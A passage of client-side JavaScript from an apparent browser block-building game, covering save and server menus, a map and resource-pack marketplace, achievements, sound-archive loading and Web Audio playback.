		worlds = {}
		if (loadString) {
			try {
				let tempWorld = new ServerWorld()
				tempWorld.loadSave(loadString,true)
				let now = Date.now()
				addWorld(`${tempWorld.name} (Pre-loaded)`, tempWorld.version, loadString.length, now)
				worlds[now] = {
					code: loadString,
					id: now
				}
			}
			catch(e) {
				console.log("Unable to load hardcoded save.")
				console.error(e)
			}
		}
		loadFromDB().then(async res => {
			if (res && res.length) {
				res = res.map(d => d.data).filter(d => d && d.code).sort((a, b) => b.edited - a.edited)
				for (let data of res) {
					addWorld(data.name, data.version, data.code.length, data.id, data.edited, data.thumbnail, false)
					worlds[data.id] = data
				}
			}
      
      let cloudSaves = await fetch('saves', {headers:{Authorization:userSessionString}}).then(res => res.json(), console.error)
			if (Array.isArray(cloudSaves) && cloudSaves.length) {
				cloudSaves.sort((a,b) => b.edited - a.edited)
				for (let data of cloudSaves) {
					if (worlds[data.id] && worlds[data.id].edited >= data.edited) continue
					addWorld(data.name, data.version, data.size, data.id, data.edited, data.thumbnail, true)
					data.cloud = true
					worlds[data.id] = data
				}
			}
      
			window.worlds.onclick = () => Button.draw()
			window.boxCenterTop.onkeyup = () => Button.draw()
		})
	}

	const serversMenuDeselect = () => {
		let elem = window.servers.getElementsByClassName("selected")
		if (elem && elem[0]) {
			elem[0].querySelector(".buttonContainer").remove()
			elem[0].classList.remove("selected")
		}
	}
  var servers = {}
  async function initServersMenu() {
		while (window.servers.firstChild) {
			window.servers.removeChild(window.servers.firstChild)
		}
		selectedWorld = null

		function addWorld(server) {
      let {name,id,host,players,external,banned,whitelist,thumbnail,version} = server
      
			let div = doc.createElement("div")
			div.className = "world"
			div.onclick = e => {
				serversMenuDeselect()
				div.classList.add("selected")
				selectedWorld = id

				let buttonContainer = doc.createElement("div")
				buttonContainer.className = "buttonContainer"
				if(!servers[selectedWorld].version || servers[selectedWorld].version === window.version){
					addButton(buttonContainer,"Join Server",async() => {
						changeScene("multiplayer connecting")
						addToBottomRightList("Authenticating")
						var logged = await loggedIn()
				    if(!logged){
				      return changeScene("multiplayer menu")
				    }
						initMultiplayer(servers[selectedWorld].id).then(joinWorld)
					})
				}else addButton(buttonContainer,"Join Server", emptyFunc, "Different version").disable()
				if(servers[selectedWorld].url){
					addButton(buttonContainer,"More Information", () => window.open("https://"+servers[selectedWorld].url, "_blank"),"Open website for this server.","right")
				}
				div.appendChild(buttonContainer)
			}
			let br = "<br>"
			div.id = id
      if((banned && typeof banned[p.username] === "string") || (whitelist && !whitelist.includes(p.username))) div.innerHTML += "<div class='lockImg'></div>"
      div.innerHTML += "<div class='ping'>Pinging...</div>"
			if(thumbnail) div.innerHTML += "<img class='thumbnail' src='" + thumbnail + "'></div>"
			div.innerHTML += "<strong>" + Messages.format(name)+ "</strong>" + br
      if(external) div.innerHTML += Messages.format(server.description) + br
      else div.innerHTML += "Hosted by "+host + br
      if(players) div.innerHTML += players.length+" player"+(players.length===1 ? "" : "s")+" online"+br
			div.innerHTML += version + br
			if (whitelist) div.innerHTML += "Whitelisted" + br
			
      servers[id] = server
			window.servers.appendChild(div)
		}

		let worlds = await getWorlds(addWorld, (id,ping) => {
      if(screen !== "multiplayer menu") return
      var el = doc.getElementById(id)
      if(!el) return
      let p = el.querySelector(".ping")
      if(!p) return
      if(typeof ping === "number"){
        var y
        if(ping > 800) y = -56
        else if(ping > 600) y = -42
        else if(ping > 400) y = -28
        else if(ping > 200) y = -14
        else y = 0
        p.innerHTML = ping+" ms <div class='img' style='background-position:0 "+y+"px;'></div>"
      }else if(ping === "timeout"){
        p.innerHTML = "Ping timed out <div class='img' style='background-position:0 -70px;'></div>"
      }else{
        p.innerHTML = "Error <div class='img' style='background-position:0 -70px;'></div>"
      }
      p.setAttribute("pingDone",true)
    })
    //if(worlds === "notLoggedIn") return changeScene("main menu")
    if(typeof worlds === "string") return window.servers.innerHTML = "<div class='message'>"+worlds+"</div>"
		if(!worlds.length) window.servers.insertAdjacentHTML('beforeend',"<div class='select-message'>No servers. You can host one by clicking 'Enable Multiplayer' in a world.</div>")

    for(var el of window.servers.querySelectorAll(".world")){
      let p = el.querySelector(".ping")
      if(!p.getAttribute("pingDone")) p.innerHTML = "Ping failed <div class='img' style='background-position:0 -70px;'></div>"
    }
    var pingStart = Date.now()
    function addPingMsg(msg){
      var div = document.createElement("div")
      div.classList.add("select-message")
      div.innerHTML = msg
      window.servers.prepend(div)
    }
    await fetch("/test").then(r => r.text()).then(r => {
      if(r !== "test"){
        console.log(r)
        throw new Error("The main server didn't respond correctly.")
      }
      var ping = Date.now() - pingStart
      var y
      if(ping > 800) y = -56
      else if(ping > 600) y = -42
      else if(ping > 400) y = -28
      else if(ping > 200) y = -14
      else y = 0
      addPingMsg("Your ping: "+ping+" ms <div class='pingImg' style='background-position:0 "+y+"px;'></div>")
    }, e => {
      addPingMsg("Something went wrong when pinging: "+e)
      console.error(e)
    })
    
		window.servers.onclick = () => Button.draw()
	}
  let marketplace = {}; let marketplaceData = null
	let downloadingProgress = 0, downloadingTotal = 0
	let marketplaceCategory = null
	let marketplaceSearch = document.createElement("div"), marketplaceSearchInput
	{//marketplace search
		marketplaceSearch.style.position = "relative"
		marketplaceSearch.style.margin = "8px"
		marketplaceSearchInput = doc.createElement("input")
		marketplaceSearchInput.type = "search"
		marketplaceSearchInput.placeholder = "Search..."
		marketplaceSearch.appendChild(marketplaceSearchInput)
		let button = doc.createElement("button")
		button.id = "marketplaceSearchButton"
		button.textContent = "Search"
		button.style.position = "absolute"
		button.style.height = "100%"
		marketplaceSearch.appendChild(button)
		button.onclick = initMarketplace
		marketplaceSearchInput.onkeypress = e => {
			if(e.key.toLowerCase() === "enter") initMarketplace()
		}
	}
	const marketplaceDeselect = () => {
		let elem = window.marketplace.getElementsByClassName("selected")
		if (elem && elem[0]) {
			elem[0].classList.remove("selected")
		}
	}
  async function initMarketplace(){
    selectedWorld = null
    marketplace = {}, marketplaceData = []
		const search = marketplaceSearchInput.value
		while (window.marketplace.firstChild) {
			window.marketplace.removeChild(window.marketplace.firstChild)
		}
		window.marketplace.appendChild(marketplaceSearch)
		let progEl = document.createElement("div")
		progEl.className = "select-message"
		window.marketplace.appendChild(progEl)
		let loaded1 = 0, loaded2 = 0, max1 = 0, max2 = 0, max3 = 0, loaded3 = 0
		const load1 = (l,t) => {loaded1=l; max1=t; updateProg()}
		const load2 = (l,t) => {loaded2=l; max2=t; updateProg()}
		const load3 = (l,t) => {loaded3=l; max3=t; updateProg()}
		function updateProg(){
			let loaded = (loaded1+loaded2+loaded3)/(max1+max2+max3)
			progEl.innerHTML = floor(loaded*100)+"%"+" "+formatBytes(loaded1)+"/"+formatBytes(max1)+" "+formatBytes(loaded2)+"/"+formatBytes(max2)+" "+formatBytes(loaded3)+"/"+formatBytes(max3)
		}
		await Promise.all([
			!search && fetch("/server/mapCategories").then(r => r.json()).then(r => {
				window.marketplace.prepend(document.createElement("br"))
				for(let i of r.reverse()){
					let a = document.createElement("a")
					a.textContent = i.replace(/[A-Z]/g, " $&").replace(/./, c => c.toUpperCase())
					a.id = "mapCategory_"+i
					a.className = "link"
					a.onclick = function(){
						marketplaceCategory = this.id.replace("mapCategory_","")
						initMarketplace()
					}
					window.marketplace.prepend(a)
				}
				let a = document.createElement("a")
				a.textContent = "All"
				a.className = "link"
				a.onclick = function(){
					marketplaceCategory = null
					initMarketplace()
				}
				window.marketplace.prepend(a)
			}),
			(async function(){
				let data = await fetch(search ? "/server/mapsSearch?q="+encodeURIComponent(search) : (marketplaceCategory ? "/server/mapsCategory/"+marketplaceCategory : "/server/maps")).then(r => showProgressFromResponse(r,load2)).then(r => r.json())
				for(var m in data){
					let v = data[m]
					v.rp = m.startsWith("rp:")
					if(v.rp) v.fetchUrl = "/server/rp/"+v.name
					else v.fetchUrl = "/server/map/"+v.name
					marketplaceData.push(v)
				}
				if(!marketplaceCategory && !search) marketplaceData.push(...await fetch("maps.json").then(r => showProgressFromResponse(r,load1)).then(r => r.json()))
			})()
		])
		progEl.remove()
    function addItem(name, version, size, id, by, edited, thumbnail, type) {
			let div = doc.createElement("div")
			div.className = "world"
			div.onclick = e => {
				marketplaceDeselect()
				div.classList.add("selected")
				selectedWorld = id
			}
			let br = "<br>"
			div.id = id
      if(thumbnail) div.innerHTML += "<img class='thumbnail' src='"+thumbnail+"' loading='lazy'>"
			div.innerHTML += "<strong>" + Messages.format(name) + "</strong>" + br
			
			if (edited){
				let str = (new Date(edited).toLocaleDateString(undefined, {
					year: "numeric",
					month: "short",
					day: "numeric",
					hour: "numeric",
					minute: "2-digit"
				}))
				div.innerHTML += str + br
			}
			if(version) div.innerHTML += version + br
			div.innerHTML += formatBytes(size)+br
      if(by) div.innerHTML += "By: "+by+br
			div.innerHTML += type+br
			
			window.marketplace.appendChild(div)
		}
    let tempWorld = new ServerWorld()
    marketplaceData.forEach((data,i) => {
      let id = data.id || ("map"+i)
      if(data.fetchUrl){
        addItem(data.name, "", data.bytes, id, data.user, data.created, data.thumbnail, data.rp ? "Resource pack" : "Map")
        marketplace[id] = data
      }else{
        let loadString, mod
        if(typeof data === "object"){
          loadString = data.loadString
          mod = data.mod
        }else loadString = data

        tempWorld.loadSave(loadString,true)
        addItem(tempWorld.name, tempWorld.version, loadString.length, id, undefined, undefined, undefined, "Map")
        marketplace[id] = {
          code: loadString,
          id: id,
          name: tempWorld.name,
          version: tempWorld.version,
          mod: mod,
          bytes: loadString.length
        }
      }
    })
    
    window.marketplace.onclick = () => Button.draw()
  }
	function initMarketplaceInfo(){
		let thing = marketplace[selectedWorld]
		marketplaceInfo.innerHTML = ""
		if(!thing) return
		if(thing.thumbnail) marketplaceInfo.innerHTML += "<img class='thumbnail' src='"+thing.thumbnail+"'>"
		marketplaceInfo.innerHTML += "<h1>"+thing.name+"</h1>"
		if(thing.user) marketplaceInfo.innerHTML += "By "+thing.user+"<br>"
		if(thing.category) marketplaceInfo.innerHTML += "Category: "+thing.category+"<br>"
		if (thing.created){
			let str = (new Date(thing.created).toLocaleDateString(undefined, {
				year: "numeric",
				month: "short",
				day: "numeric",
				hour: "numeric",
				minute: "2-digit"
			}))
			marketplaceInfo.innerHTML += str + "<br>"
		}
		marketplaceInfo.innerHTML += formatBytes(thing.bytes) + "<br>"
		if(thing.description) marketplaceInfo.innerHTML += Messages.format(thing.description)+"<br>"
		if(thing.rp){
			marketplaceInfo.innerHTML += "<label for='rpURL'>Resource pack URL</label><input name='rpURL' value='/rp/"+map.name+"'>"
		}
		if(!thing.user) return
		let mapsBy = document.createElement("div")
		marketplaceInfo.appendChild(mapsBy)
		function addThing(name, version, size, id, by, edited, thumbnail, type) {
			let div = doc.createElement("div")
			div.className = "world"
			div.onclick = e => {
				selectedWorld = id
				changeScene("marketplace info")
			}
			let br = "<br>"
			div.id = id
			if(thumbnail) div.innerHTML += "<img class='thumbnail' src='"+thumbnail+"'>"
			div.innerHTML += "<strong>" + Messages.format(name) + "</strong>" + br
			
			if (edited){
				let str = (new Date(edited).toLocaleDateString(undefined, {
					year: "numeric",
					month: "short",
					day: "numeric",
					hour: "numeric",
					minute: "2-digit"
				}))
				div.innerHTML += str + br
			}
			if(version) div.innerHTML += version + br
			div.innerHTML += formatBytes(size.toLocaleString)+br
			if(by) div.innerHTML += "By: "+by+br
			div.innerHTML += type+br
			mapsBy.appendChild(div)
		}
		fetch("/server/maps/"+thing.user).then(r => r.json()).then(r => {
			mapsBy.innerHTML = "<h2>More things by "+thing.user+"</h2>"
			for(let i in r){
				let data = r[i]
				addThing(data.name, "", data.bytes, data.id, "", data.created, data.thumbnail, i.startsWith("rp:") ? "Resource pack" : "Map")
			}
		})
	}
  function saveFromMarketplace(){
    let save = marketplace[selectedWorld]
		if(save.rp){
			downloadingProgress = 0, downloadingTotal = 0
      changeScene("downloading")
			fetch("/rp/"+save.name).then(r => showProgressFromResponse(r, (l,t) => {
				downloadingProgress = l
				downloadingTotal = t
			})).then(r => r.json()).then(r => {
				installResourcePack("/rp/"+save.name,r).then(() => {
					initWorldsMenu()
        	changeScene("loadsave menu")
				}).catch(e => {
					console.error(e)
          alert("Error saving map: "+e)
          changeScene("marketplace")
				})
			}).catch(e => {
				alert("Error fetching map: "+e)
        changeScene("marketplace")
			})
		}else if(save.fetchUrl){
			downloadingProgress = 0, downloadingTotal = 0
      changeScene("downloading")
      fetch(save.fetchUrl).then(r => showProgressFromResponse(r, (l,t) => {
				downloadingProgress = l
				downloadingTotal = t
			})).then(r => r.json()).then(data => {
        try{
          var loadString
          if(data.file){
            data.file = JSON.parse(data.file)
            loadString = data.file.code
          }else{
            loadString = data.code
          }
          let id = generateID()
          if(data.file){
            data.file.id = id
            data.file.edited = Date.now()
            if(data.file.name !== data.name) data.file.name = data.name+" ("+data.file.name+")"
            saveToDB(id, data.file)
          }else{
            let tempWorld = new ServerWorld()
            tempWorld.loadSave(loadString,true)
            saveToDB(id, {
              id: id,
              edited: Date.now(),
              name: tempWorld.name === data.name ? data.name : data.name+" ("+tempWorld.name+")",
              version: tempWorld.version,
              code: data.code,
              mod: (data.file && data.file.mod) || null
            })
          }
          initWorldsMenu()
          changeScene("loadsave menu")
        }catch(e){
          console.error(e)
          alert("Error saving map: "+e)
          changeScene("marketplace")
        }
      }).catch(e => {
        alert("Error fetching map: "+e)
        changeScene("marketplace")
      })
    }else{
      save.id = generateID()
      saveToDB(save.id, {
        id: save.id,
        edited: Date.now(),
        name: save.name,
        version: save.version,
        code: save.code,
        mod: save.mod
      })
      initWorldsMenu()
      changeScene("loadsave menu")
    }
  }
	function initAchievmentsMenu(newScene){
		let d = (newScene||screen) === "achievments discoveries"
		while (window.achievments.firstChild) {
			window.achievments.removeChild(window.achievments.firstChild)
		}
		function addItem(id,done){
			let div = doc.createElement("div")
			div.className = "achievment"+(done ? " done" : "")
			if(id & 256){
				div.innerHTML = "<strong>"+blockData[id>>9].Name+"</strong>"
				if(blockInfo[blockInfoIds[id>>9]]) div.innerHTML += "<br>"+blockInfo[blockInfoIds[id>>9]].data
			}else{
				div.innerHTML = "<strong>"+achievementTypes[id].name+"</strong><br>"+achievementTypes[id].description
			}
			window.achievments.appendChild(div)
		}
		if(d){
			let blocks = achievments.filter(r => (r&256))
			let message = doc.createElement("div")
			message.className = "select-message"
			message.innerHTML = blocks.length+" blocks and items discovered."
			window.achievments.appendChild(message)
			for(let i of blocks) addItem(i)
		}else{
			let achieved = achievments.filter(r => !(r&256))
			let undone = achievementTypes.filter(r => !achievments.includes(r.id)).map(r => r.id)
			for(let i of achieved) addItem(i,true)
			for(let i of undone) addItem(i)
		}
	}

	let sounds = {
		"dirt.dig1":"refer:gravel.dig1",
		"dirt.dig2":"refer:gravel.dig2",
		"dirt.dig3":"refer:gravel.dig3",
		"dirt.dig4":"refer:gravel.dig4",
		"dirt.step1":"refer:gravel.step1",
		"dirt.step2":"refer:gravel.step2",
		"dirt.step3":"refer:gravel.step3",
		"dirt.step4":"refer:gravel.step4"
	}
  let soundVolumes = {
		"dirt.step1":0.5,
		"dirt.step2":0.5,
		"dirt.step3":0.5,
		"dirt.step4":0.5,
		"gravel.step1":0.5,
		"gravel.step2":0.5,
		"gravel.step3":0.5,
		"gravel.step4":0.5,
		"fire.fire":0.125,
		"portal.portal":0.125,
		"cow.step1":0.1,
		"cow.step2":0.1,
		"cow.step3":0.1,
		"cow.step4":0.1,
		"pig.step1":0.1,
		"pig.step2":0.1,
		"pig.step3":0.1,
		"pig.step4":0.1,
		"pig.step5":0.1,
		"sheep.step1":0.1,
		"sheep.step2":0.1,
		"sheep.step3":0.1,
		"sheep.step4":0.1,
		"sheep.step5":0.1,
		"chicken.step1":0.1,
		"chicken.step2":0.1,
		"zombie.step1":0.1,
		"zombie.step2":0.1,
		"zombie.step3":0.1,
		"zombie.step4":0.1,
		"zombie.step5":0.1,
		"skeleton.step1":0.1,
		"skeleton.step2":0.1,
		"skeleton.step3":0.1,
		"skeleton.step4":0.1,
		"spider.step1":0.1,
		"spider.step2":0.1,
		"spider.step3":0.1,
		"spider.step4":0.1,
		"liquid.water":0.125,
		"liquid.lava":0.125,
  }
	let soundPitches = {
		"dirt.dig1":0.8,
		"dirt.dig2":0.8,
		"dirt.dig3":0.8,
		"dirt.dig4":0.8,
		"portal.portal":0.5,
		"portal.travel":0.75
	}
  win.sounds = sounds
  let music = {
    menu:{
      1:"long%20song.wav"
    }
  }
  win.music = music
  let soundNames = []
  win.soundNames = soundNames
  /*{
    function goThroughSoundObj(obj,prefix){
      for(var i in obj){
        var name = prefix ? prefix+"."+i : i
        if(typeof obj[i] === "object"){
          goThroughSoundObj(obj[i],name)
        }else{
          soundNames.push(name)
        }
      }
    }
    goThroughSoundObj(sounds)
  }*/
  async function decompress(compression,input){//from https://dev.to/lucasdamianjohnson/compress-decompress-an-arraybuffer-client-side-in-js-2nf6
		const ds = new DecompressionStream(compression);
		const writer = ds.writable.getWriter();
		writer.write(input);
		writer.close();
		const output = [];
		const reader = ds.readable.getReader();
		let totalSize = 0;
		while (true) {
		const { value, done } = await reader.read();
		if (done) break;
		output.push(value);
		totalSize += value.byteLength;
		}
		const concatenated = new Uint8Array(totalSize);
		let offset = 0;
		for (const array of output) {
		concatenated.set(array, offset);
		offset += array.byteLength;
		}
		return concatenated;
	}
	async function loadEPK(arr){
		let r = new ByteArrayReader(new Uint8Array(arr))
		if(r.ascii(8) !== "EAGPKG$$") throw new Error("wrong type")
		let version = r.asciiVar()
		if(!version.startsWith("ver2.")) throw new Erorr("wrong version")
		r.skip(r.uint8())
		r.skip(r.uint16())
		r.skip(8)
		let files = r.int32()
		let type = r.char()
		let dr
		if(type === "G"){
			dr = new ByteArrayReader(await decompress("gzip",arr.slice(r.idx,arr.byteLength-8)))
		}else if(type === "Z"){
			dr = new ByteArrayReader(await decompress("deflate",arr.slice(r.idx,arr.byteLength-8)))
		}else if(type === "0") dr = r
		else throw new Error("wrong compression")
		let out = {}
		for(let i=0; i<files; i++){
			let blockType = dr.ascii(4)
			let name = dr.asciiVar()
			let len = dr.int32()
			if(!i){
				if(blockType === "HEAD"){
					let readType = dr.ascii(len)
					if(name !== "file-type" || readType !== "epk/resources") throw new Error("epk not correct file type")
				}else throw new Error("expect head first")
			}else if(blockType === "FILE"){
				if(len<5) throw new Error("incomplete")
				dr.skip(4)//crc
				out[name] = dr.toarr(len-5).buffer
				if(dr.char() !== ":") throw new Error("incomplete")
			}else dr.skip(len)
			if(dr.char() !== ">") throw new Error("incomplete")
		}
		if(dr.ascii(4) !== "END$") throw new Error("missing end")
		return out
	}
  /*async function loadSoundBuffer(url){
		let request = await fetch(url)
		let buffer = await audioCtx.decodeAudioData(await request.arrayBuffer())
		buffer.StAtUS = request.status
		return buffer
  }*/
  function initAudioCtx(){
    try{
      window.AudioContext = window.AudioContext || window.webkitAudioContext;
      audioCtx = new AudioContext();
    }catch(e) {
      reportError('Web Audio API is not supported in this browser');
      return
    }
		listener = audioCtx.listener
		if(!listener) alert("AudioListener not supported. The AudioListener interface represents the position and orientation of the unique person listening to the audio scene")
		win.audioCtx = audioCtx, win.listener = listener
    
		const nosound = urlParams.has("nosound")
		async function loadSounds(){
			if(!nosound){
				let f = await fetch("assets/sounds.txt").catch(e => {console.log(e); return null })
				if(f && f.ok){
					let soundData = await loadEPK(await f.arrayBuffer())
					loadDone("Loaded sounds","",f.status)
					for(let s in soundData){
						let newName = s.replace(".ogg","").replace(/\//g,".")
						try{
							sounds[newName] = await audioCtx.decodeAudioData(soundData[s])
						}catch(e){console.error(e)}
						soundNames.push(newName)
					}
					loadDone("Extracted sounds","",f.status)
				}else{
					loadDone("Failed load sounds","fail")
					loadDone("No extract sounds","fail")
				}
			}else{
				loadDone("No load sounds","fail")
				loadDone("No extract sounds","fail")
			}
		}
    /*async function loadSoundsObj(obj, prefix=""){
      for(let i in obj){
				let soundName = prefix ? prefix+"."+i : i
        if(typeof obj[i] === "object"){
          loadSoundsObj(obj[i], soundName)
        }else{
          let url = obj[i].startsWith("https://") ? obj[i] : "assets/sounds/"+obj[i]
          let loadIt = !obj[i].startsWith("refer:")
          if(loadIt){
						if(nosound){
							loadDone("No load "+soundName,"fail")
							continue
						}
            await loadSoundBuffer(url).then(buffer => {
              obj[i] = buffer
              loadDone("Loaded "+soundName,"",buffer.StAtUS)
            }).catch(thing => {
              loadDone("Failed to load "+soundName,"fail",thing.status)
            })
          }
        }
      }
    }*/
    function loadMusicObj(obj){
      for(var i in obj){
        if(typeof obj[i] === "object"){
          loadMusicObj(obj[i])
        }else{
          var url = "assets/"+obj[i]
          var audio = new Audio(nosound ? undefined : url)
          audio.crossOrigin = ""
          var source = audioCtx.createMediaElementSource(audio)
          var gainNode = audioCtx.createGain();
          source.connect(gainNode);
          gainNode.gain.value = 1
          gainNode.connect(audioCtx.destination);
          obj[i] = {
            audio,
            source,
            gainNode,
            gain: gainNode.gain
          }
        }
      }
    }
    loadSounds(sounds)
    loadMusicObj(music)
    
    {
//! ZzFXM (v2.0.3) | (C) Keith Clark | MIT | https://github.com/keithclark/ZzFXM
//win.zzfx=((...z)=>zzfxP(zzfxG(...z))),win.zzfxP=((...z)=>{let t=zzfxX.createBufferSource(),f=zzfxX.createBuffer(z.length,z[0].length,zzfxR);return z.map((z,t)=>f.getChannelData(t).set(z)),t.buffer=f,t.connect(zzfxX.destination),t.start(),t}),win.zzfxG=((z=1,t=.05,f=220,a=0,x=0,e=.1,n=0,h=1,M=0,r=0,R=0,i=0,o=0,s=0,u=0,c=0,d=0,l=1,b=0,m=0)=>{let P,X,g=2*Math.PI,C=M*=500*g/zzfxR**2,p=(0<u?1:-1)*g/4,w=f*=(1+2*t*Math.random()-t)*g/zzfxR,A=[],B=0,G=0,I=0,V=1,k=0,D=0,S=0;for(a=99+zzfxR*a,b*=zzfxR,x*=zzfxR,e*=zzfxR,d*=zzfxR,r*=500*g/zzfxR**3,u*=g/zzfxR,R*=g/zzfxR,i*=zzfxR,o=zzfxR*o|0,X=a+b+x+e+d|0;I<X;A[I++]=S)++D%(100*c|0)||(S=n?1<n?2<n?3<n?Math.sin((B%g)**3):Math.max(Math.min(Math.tan(B),1),-1):1-(2*B/g%2+2)%2:1-4*Math.abs(Math.round(B/g)-B/g):Math.sin(B),S=(o?1-m+m*Math.sin(2*Math.PI*I/o):1)*(0<S?1:-1)*Math.abs(S)**h*z*zzfxV*(I<a?I/a:I<a+b?1-(I-a)/b*(1-l):I<a+b+x?l:I<X-d?(X-I-d)/e*l:0),S=d?S/2+(d>I?0:(I<X-d?1:(X-I)/d)*A[I-d|0]/2):S),B+=(P=(f+=M+=r)*Math.sin(G*u-p))-P*s*(1-1e9*(Math.sin(I)+1)%2),G+=P-P*s*(1-1e9*(Math.sin(I)**2+1)%2),V&&++V>i&&(f+=R,w+=R,V=0),!o||++k%o||(f=w,M=C,V=V||1);return A}),win.zzfxV=.3,win.zzfxR=44100,win.zzfxX=audioCtx;
//win.zzfxM=(n,f,t,e=125)=>{let l,o,z,r,g,h,x,a,u,c,d,i,m,p,G,M=0,R=[],b=[],j=[],k=0,q=0,s=1,v={},w=zzfxR/e*60>>2;for(;s;k++)R=[s=a=d=m=0],t.map((e,d)=>{for(x=f[e][k]||[0,0,0],s|=!!f[e][k],G=m+(f[e][0].length-2-!a)*w,p=d==t.length-1,o=2,r=m;o<x.length+p;a=++o){for(g=x[o],u=o==x.length+p-1&&p||c!=(x[0]||0)|g|0,z=0;z<w&&a;z++>w-99&&u?i+=(i<1)/99:0)h=(1-i)*R[M++]/2||0,b[r]=(b[r]||0)-h*q+h,j[r]=(j[r++]||0)+h*q+h;g&&(i=g%1,q=x[1]||0,(g|=0)&&(R=v[[c=x[M=0]||0,g]]=v[[c,g]]||(l=[...n[c]],l[2]*=2**((g-12)/12),g>0?zzfxG(...l):[])))}m=G});return[b,j]}
    }
  }
	let tempSoundSources = []
  function playSound(name, start, volume, pitch, panner, onend, loop, getSourceFunc){ //some code from https://www.html5rocks.com/en/tutorials/webaudio/intro/
    if(!settings.volume) return
    let sound, soundVol, soundPitch
    /*if(name.includes(".")){
      sound = sounds
      soundVol = soundVolumes
			soundPitch = soundPitches
      name = name.split(".")
			let prevObj, prevPrevObj
      for(var i=0; i<name.length; i++){
        let n = name[i]
        if(sound[n]){
					prevPrevObj = prevObj
					prevObj = sound
          sound = sound[n]
        }else return
        if(soundVol[n]) soundVol = soundVol[n]
				if(soundPitch[n]) soundPitch = soundPitch[n]
      }
			if(typeof sound === "string"){
				if(sound.startsWith("refer:")){
					sound = prevPrevObj[sound.replace("refer:","")][name[name.length-1]]
				}
			}
    }else{
      sound = sounds[name]
      soundVol = soundVolumes[name]
      if(!sound) return
    }*/
		sound = sounds[name]
		soundVol = soundVolumes[name]
		soundPitch = soundPitches[name]
		if(typeof sound === "string" && sound.startsWith("refer:")) sound = sounds[sound.replace("refer:","")]
    if(!volume && volume !== 0) volume = 1
    if(typeof soundVol !== "number") soundVol = 1
		//if(reverb) volume *= 0.5
    volume *= soundVol
    volume *= settings.volume
		if(typeof soundPitch === "number") pitch = pitch ? soundPitch*pitch : soundPitch
    let buffer = sound
    if(!audioCtx || !buffer || (typeof buffer === "string") || volume <= 0) return
		let source = audioCtx.createBufferSource()
		source.buffer = buffer
		/*if(reverb){
			for(let i=0; i<5; i++){
				let s = audioCtx.createBufferSource()
				s.buffer = buffer
				source.push(s)
			}
		}*/
		let gainNode//, convolver
		if(panner){
			gainNode = audioCtx.createGain()
			gainNode.gain.value = volume
			source.connect(gainNode)
			gainNode.connect(panner).connect(audioCtx.destination)
		}else if(((!(volume || volume === 0)) || volume === 1) && !getSourceFunc){
			source.connect(audioCtx.destination)
		}else{
			gainNode = audioCtx.createGain()
			gainNode.gain.value = volume
			source.connect(gainNode)
			gainNode.connect(audioCtx.destination)
		}
		if(pitch) {
			if(Array.isArray(pitch)){
				pitch = rand(pitch[0],pitch[1])
			}
			source.playbackRate.value = pitch
		}
		if(onend) source.onended = onend
		if(loop) source.loop = true
		/*if(reverb){
			let time = audioCtx.currentTime + (start/1000)
			for(let i=0; i<source.length; i++){
				source[i].start(time + Math.random()/50);
			}
		}*/
		source.start(start ? audioCtx.currentTime + (start/1000) : 0)
		if(getSourceFunc) getSourceFunc(source, gainNode, volume)
		return true
  }
  win.playSound = playSound
  function blockSound(blockID, type, x,y,z, volume){
    let block = blockData[blockID], panner
    if(typeof x === "number") panner = posSound(x,y,z)
		if(typeof volume !== "number") volume = 1
    
    let sound, pitch = 1
    switch(type){
      case "place":
        sound = block.placeSound || block.digSound
        break;
      case "dig":
        sound = block.digSound
        break;
      case "step":
        sound = block.stepSound
        break;
			case "lowStep":
				sound = block.stepSound
				pitch = 0.5
        break;
      case "breaking":
        sound = block.stepSound
				pitch = 0.5
				volume *= 0.5
        break;
      case "land":
        sound = block.landSound || block.digSound
    }
    if(typeof sound === "function") return sound()
    if(Array.isArray(sound)){
      sound = sound[Math.floor(Math.random()*sound.length)]
    }
    if(sound){
      playSound(sound, 0, volume, pitch,panner)
      send({type:"playSound", data:sound, x:x,y:y,z:z})
    }
  }
  win.blockSound = blockSound
  
  function posSound(x,y,z, hearDist = 16,mono){
    if(mono){
      var volume = 1
      if((x || x===0) && (y || y===0) && (z || z===0)){
        //var falloff = volume > 16 ? 16*volume : 16
        var dist = dist3(x,y,z, p2.x, p2.y, p2.z)
        //volume = dist > falloff ? volume - ((dist - falloff) / 10) : volume
        volume = volume - (dist / 16)
        if(volume < 0) volume = 0
      }
      return volume
    }
    return new PannerNode(audioCtx, {
      panningModel: "HRTF",
      distanceModel: "linear",
      positionX: x,
      positionY: y,
      positionZ: z,
      orientationX: 0,
      orientationY: 0,
      orientationZ: -1,
      rolloffFactor: 1,
      maxDistance: hearDist
    })
  }
  win.posSound = posSound
  function eatSound(){
    var i = Math.ceil(Math.random()*3)
    playSound("random.eat"+i)
    if(multiplayer) send({type:"playSound", data:"random.eat"+i, x:p.x,y:p.y,z:p.z})
  }
  
  function playMusic(a, onend = null){
    var audio = a.audio
    audio.currentTime = 0
    audio.onended = function(){
      audio.onended = null
      if(onend) onend()
    }
    audio.play().catch(console.warn)
    return a
  }
  win.playMusic = playMusic
  
  let menuMusicVolume = 0, lastUpdateMusic = performance.now()
  let menuMusicIdx = 0
  let currentMusic = null
  function updateMusic(){
		let now = performance.now(), dt = (now - lastUpdateMusic) / 4000
    if(screen === "play" || screen === "pause" || screen === "inventory" || screen === "crafting" || screen === "furnace" || screen === "chest" || screen === "anvil" || screen === "dispenser" || screen === "hopper" || screen === "options" || screen.startsWith("options ") || screen === "chat" || screen === "edit sign" || screen === "sleep" || screen === "endPoem" || screen === "custom menu" || screen === "options language" || screen === "temporary dead" || screen === "commandBlock"){
      if(menuMusicVolume > 0) menuMusicVolume -= dt
      if(menuMusicVolume < 0) menuMusicVolume = 0
      if(currentMusic && menuMusicVolume === 0){
        currentMusic.audio.pause()
        console.log("stop menu music")
        currentMusic = null
      }
    }else{
      if(menuMusicVolume < 1) menuMusicVolume += dt
      if(menuMusicVolume > 1) menuMusicVolume = 1
      if(!currentMusic){
        menuMusicIdx ++
        if(!music.menu[menuMusicIdx]) menuMusicIdx = 1
        currentMusic = playMusic(music.menu[menuMusicIdx], () => currentMusic = null)
        console.log("play menu music",menuMusicIdx)
      }
    }
    if(currentMusic){
      currentMusic.gain.value = menuMusicVolume * settings.volume
    }
		lastUpdateMusic = now
  }
  function tryPlayMusic(){
		if(!currentMusic) return
    currentMusic.audio.play().catch(console.error)
		menuMusicVolume = 0
    audioCtx.resume()
    document.removeEventListener("mousedown", tryPlayMusic)
    document.removeEventListener("touchstart", tryPlayMusic)
    console.log("%cTry Play Music!", "background:#0a0;color:white;padding:10px 20px;")
  }
